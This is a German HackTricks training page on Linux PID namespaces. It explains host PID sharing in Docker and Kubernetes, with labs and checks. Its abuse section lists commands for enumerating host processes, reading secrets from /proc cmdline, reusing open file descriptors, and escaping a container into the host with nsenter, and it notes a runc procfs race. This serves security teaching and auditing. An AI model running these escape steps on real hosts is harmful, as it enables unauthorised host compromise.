# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der PID namespace kontrolliert, wie Prozesse nummeriert werden und welche Prozesse sichtbar sind. Deshalb kann ein Container seine eigene PID 1 haben, obwohl er keine echte Maschine ist. Innerhalb des namespace sieht der workload, was wie ein lokaler Prozessbaum erscheint. Außerhalb des namespace sieht der Host weiterhin die echten Host-PIDs und die vollständige Prozesslandschaft.

Aus Sicherheitssicht ist der PID namespace wichtig, weil Prozesssichtbarkeit wertvoll ist. Sobald ein workload Host-Prozesse sehen kann, kann er möglicherweise Service-Namen, Kommandozeilenargumente, in Prozessargumenten übergebene Secrets, über `/proc` abgeleiteten Umgebungszustand und potenzielle Ziele für Namespace-Eintritt beobachten. Wenn er mehr tun kann als diese Prozesse nur zu sehen, zum Beispiel Signale zu senden oder ptrace unter geeigneten Bedingungen zu verwenden, wird das Problem deutlich ernster.

## Funktionsweise

Ein neuer PID namespace beginnt mit einer eigenen internen Prozessnummerierung. Der erste Prozess, der darin erzeugt wird, wird aus Sicht des namespace zur PID 1, was auch bedeutet, dass er spezielle init-ähnliche Semantiken für verwaiste Kinder und Signalverhalten erhält. Das erklärt viele Container-Eigenheiten im Zusammenhang mit init-Prozessen, Zombie-Reaping und warum in Containern manchmal kleine init-Wrappers verwendet werden.

Die wichtige Sicherheitslektion ist, dass ein Prozess isoliert erscheinen kann, weil er nur seinen eigenen PID-Baum sieht, diese Isolation aber absichtlich aufgehoben werden kann. Docker bietet dies über `--pid=host` an, während Kubernetes es über `hostPID: true` ermöglicht. Sobald der Container dem Host PID namespace beitritt, sieht der workload Host-Prozesse direkt, und viele spätere Angriffswege werden dadurch realistischer.

## Labor

Um einen PID namespace manuell zu erstellen:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die shell sieht jetzt eine private Prozessansicht. Das Flag `--mount-proc` ist wichtig, weil es eine procfs-Instanz mountet, die mit dem neuen PID namespace übereinstimmt und so die Prozessliste von innen kohärent macht.

Um das Verhalten von Containern zu vergleichen:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Der Unterschied ist unmittelbar und leicht zu verstehen, weshalb dies ein gutes erstes Lab für die Leser ist.

## Laufzeit

Normale Container in Docker, Podman, containerd und CRI-O erhalten ihr eigenes PID namespace. Kubernetes Pods erhalten normalerweise ebenfalls eine isolierte PID-Ansicht, es sei denn, der Workload fordert ausdrücklich host PID sharing an. LXC/Incus-Umgebungen basieren auf demselben Kernel-Primitiv, obwohl System-Container-Anwendungsfälle kompliziertere Prozessbäume offenbaren und mehr Debugging-Abkürzungen begünstigen können.

Die gleiche Regel gilt überall: Wenn die Runtime sich entscheidet, den PID namespace nicht zu isolieren, ist das eine bewusste Verringerung der Container-Grenze.

## Fehlkonfigurationen

Die klassische Fehlkonfiguration ist host PID sharing. Teams rechtfertigen dies oft mit Debugging-, Monitoring- oder Service-Management-Komfort, sollten es aber stets als eine bedeutende Sicherheitsausnahme betrachten. Selbst wenn der Container standardmäßig keine unmittelbare Schreibmöglichkeit auf Host-Prozesse hat, kann schon die Sichtbarkeit viel über das System offenbaren. Sobald Fähigkeiten wie `CAP_SYS_PTRACE` oder nützlicher procfs-Zugriff hinzugefügt werden, wächst das Risiko erheblich.

Ein weiterer Fehler ist die Annahme, dass host PID sharing harmlos sei, nur weil der Workload standardmäßig Host-Prozesse nicht killen oder ptrace kann. Diese Schlussfolgerung ignoriert den Wert der Enumeration, die Verfügbarkeit von namespace-entry targets und die Art, wie PID-Sichtbarkeit mit anderen geschwächten Kontrollen kombiniert wird.

## Missbrauch

Wenn das host PID namespace geteilt ist, kann ein Angreifer Host-Prozesse inspizieren, Prozessargumente auslesen, interessante Services identifizieren, Kandidaten-PIDs für `nsenter` lokalisieren oder Prozesssichtbarkeit mit ptrace-bezogenen Privilegien kombinieren, um Host- oder benachbarte Workloads zu beeinträchtigen. In manchen Fällen reicht es, den richtigen langfristig laufenden Prozess zu sehen, um den Rest des Angriffsplans neu zu gestalten.

Der erste praktische Schritt ist immer zu bestätigen, dass Host-Prozesse wirklich sichtbar sind:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sobald Host-PIDs sichtbar sind, werden Prozessargumente und namespace-entry-Ziele oft zur nützlichsten Informationsquelle:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Wenn `nsenter` verfügbar ist und ausreichend Privilegien bestehen, prüfen Sie, ob ein sichtbarer Host-Prozess als namespace bridge verwendet werden kann:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selbst wenn der Zugriff blockiert ist, ist das Teilen der Host-PID bereits wertvoll, weil es die Service-Topologie, Laufzeitkomponenten und potenziell privilegierte Prozesse offenlegt, die als Nächstes anvisiert werden können.

Die Sichtbarkeit der Host-PID macht zudem den Missbrauch von File-Deskriptoren realistischer. Wenn ein privilegierter Host-Prozess oder eine benachbarte Workload eine sensible Datei oder einen Socket geöffnet hat, kann der Angreifer möglicherweise `/proc/<pid>/fd/` inspizieren und diesen Handle wiederverwenden — abhängig von Besitzverhältnissen, procfs-Mount-Optionen und dem Ziel-Service-Modell.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Diese Befehle sind nützlich, weil sie beantworten, ob `hidepid=1` oder `hidepid=2` die prozessübergreifende Sichtbarkeit verringern und ob offensichtlich interessante Deskriptoren wie geöffnete Secret-Dateien, Logs oder Unix-Sockets überhaupt sichtbar sind.

### Vollständiges Beispiel: host PID + `nsenter`

Host PID sharing wird zu einem direkten host escape, wenn der Prozess außerdem genügend Privilegien hat, um sich den host namespaces anzuschließen:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Wenn der Befehl erfolgreich ist, läuft der Container-Prozess nun in den host mount-, UTS-, network-, IPC- und PID-Namespaces. Die Auswirkung ist eine sofortige Kompromittierung des Hosts.

Selbst wenn `nsenter` selbst fehlt, kann dasselbe Ergebnis über eine host-Binärdatei erreicht werden, wenn das Host-Dateisystem eingehängt ist:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Aktuelle Laufzeit-Hinweise

Einige für PID-Namespaces relevante Angriffe sind keine klassischen `hostPID: true`-Fehlkonfigurationen, sondern Laufzeitimplementierungsfehler bei der Anwendung von procfs-Schutzmechanismen während der Container-Einrichtung.

#### `maskedPaths`-Race auf host procfs

In verwundbaren `runc`-Versionen konnten Angreifer, die das Container-Image oder die `runc exec`-Workload kontrollieren, die Maskierungsphase in einem Race aushebeln, indem sie das container-seitige `/dev/null` durch einen Symlink auf einen sensiblen procfs-Pfad wie `/proc/sys/kernel/core_pattern` ersetzten. Wenn das Race erfolgreich war, konnte das masked-path bind mount auf das falsche Ziel landen und hostweite procfs knobs im neuen Container freilegen.

Nützlicher Prüf-Befehl:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Das ist wichtig, da die letztendlichen Auswirkungen denen einer direkten procfs-Exposition entsprechen können: beschreibbares `core_pattern` oder `sysrq-trigger`, gefolgt von Codeausführung auf dem Host oder denial of service.

#### Namespace-Injektion mit `insject`

Namespace-Injektions-Tools wie `insject` zeigen, dass die Interaktion mit dem PID-namespace nicht immer voraussetzt, vor der Prozesseerstellung in das Ziel-namespace einzutreten. Ein Helfer kann sich später anhängen, `setns()` verwenden und ausführen, während die Sichtbarkeit in den Ziel-PID-Bereich erhalten bleibt:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Diese Art von Technik ist hauptsächlich wichtig für fortgeschrittenes Debugging, offensive tooling und post-exploitation-Workflows, bei denen der Namespace-Kontext nachträglich betreten werden muss, nachdem die Laufzeit den Workload bereits initialisiert hat.

### Verwandte FD-Missbrauchsmuster

Zwei Muster sind besonders hervorzuheben, wenn Host-PIDs sichtbar sind. Erstens kann ein privilegierter Prozess einen sensiblen file descriptor über `execve()` offen halten, weil er nicht mit `O_CLOEXEC` markiert wurde. Zweitens können Services file descriptors über Unix sockets mittels `SCM_RIGHTS` weiterreichen. In beiden Fällen ist das interessante Objekt nicht mehr der Pfadname, sondern der bereits geöffnete Handle, den ein Prozess mit niedrigerer Berechtigung erben oder erhalten kann.

Das ist bei der Arbeit mit Containern relevant, weil der Handle auf `docker.sock`, ein privilegiertes Log, eine host secret file oder ein anderes wertvolles Objekt zeigen kann, selbst wenn der Pfad vom Container-Dateisystem aus nicht direkt erreichbar ist.

## Checks

Der Zweck dieser Befehle ist zu ermitteln, ob der Prozess eine private PID-Ansicht hat oder ob er bereits eine deutlich größere Prozesslandschaft auflisten kann.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Wenn die Prozessliste offensichtliche Host-Dienste enthält, ist Host-PID-Sharing wahrscheinlich bereits aktiv.
- Dass man nur einen kleinen container-lokalen Prozessbaum sieht, ist der normale Ausgangszustand; `systemd`, `dockerd` oder andere nicht zugehörige Daemons zu sehen, ist es nicht.
- Sobald Host-PIDs sichtbar sind, werden selbst schreibgeschützte Prozessinformationen zu nützlicher Aufklärung.

Wenn du einen Container findest, der mit Host-PID-Sharing läuft, behandle das nicht als rein kosmetischen Unterschied. Es ist eine wesentliche Änderung dessen, was die Workload beobachten und potenziell beeinflussen kann.
{{#include ../../../../../banners/hacktricks-training.md}}
